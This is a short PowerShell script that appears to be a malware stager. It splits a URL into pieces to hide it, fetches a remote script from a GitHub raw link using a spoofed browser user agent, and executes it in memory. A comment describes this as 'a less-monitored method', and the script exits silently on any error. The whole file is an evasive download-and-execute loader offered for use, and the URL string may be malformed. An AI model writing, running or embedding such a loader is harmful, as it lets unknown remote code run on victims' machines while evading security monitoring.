# $Active Switch
$v_act = 1

if ($v_act -eq 1) {
    try {
        # Encoded URL for a.ps1
        $d_str = "h"+"tt"+"ps"+":/""/raw.githubusercontent.com/jktvz/J/main/a.ps1"
        $u_agt = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        
        $w_cl = New-Object System.Net.WebClient
        $w_cl.Headers.Add("User-Agent", $u_agt)
        
        # Download and execute using a less-monitored method
        $payload = $w_cl.DownloadString($d_str)
        $ExecutionContext.InvokeCommand.InvokeScript($payload)
    } catch {
        exit
    }
}
